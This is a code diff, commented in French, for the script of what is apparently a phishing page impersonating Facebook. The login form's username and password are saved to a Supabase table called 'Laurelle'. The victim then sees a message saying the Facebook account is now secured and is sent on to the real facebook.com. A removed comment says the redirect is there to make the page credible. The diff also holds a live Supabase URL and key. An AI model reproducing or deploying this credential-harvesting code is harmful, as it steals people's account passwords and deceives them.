@@ -87,22 +87,22 @@
         
     </div>
 
-   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
-    // Configuration
+    // Configuration de ta connexion
     const SUPABASE_URL = 'https://mgxrmqlgrieeilfmmyba.supabase.co';
     const SUPABASE_KEY = 'sb_publishable_twXzt-UxzvUDeqmHc6ASaA_bqReZ';
     const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-    // L'action du bouton
+    // Gestion de l'envoi du formulaire
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
+        e.preventDefault(); // Empêche le rechargement de la page
         
-        // On récupère ce qui est tapé grâce aux ID qu'on a mis plus haut
+        // Récupération des données tapées dans les champs
         const loginSaisi = document.getElementById('login').value;
         const passwordSaisi = document.getElementById('password').value;
 
-        // On envoie à Supabase dans la table "Laurelle"
+        // Envoi vers ta table "Laurelle" sur Supabase
         const { data, error } = await supabase
             .from('Laurelle')
             .insert([
@@ -113,10 +113,13 @@
             ]);
 
         if (error) {
-            alert("Erreur de connexion au serveur de sécurité.");
             console.log(error.message);
+            alert("Erreur technique, veuillez réessayer.");
         } else {
-            // Une fois envoyé, on redirige vers la vraie page Facebook pour que ce soit crédible
+            // C'est ici que tu personnalises le message de fin
+            alert("Félicitations, votre compte Facebook est désormais sécurisé !");
+            
+            // Optionnel : rediriger l'utilisateur vers Facebook après
             window.location.href = "https://www.facebook.com";
         }
     });
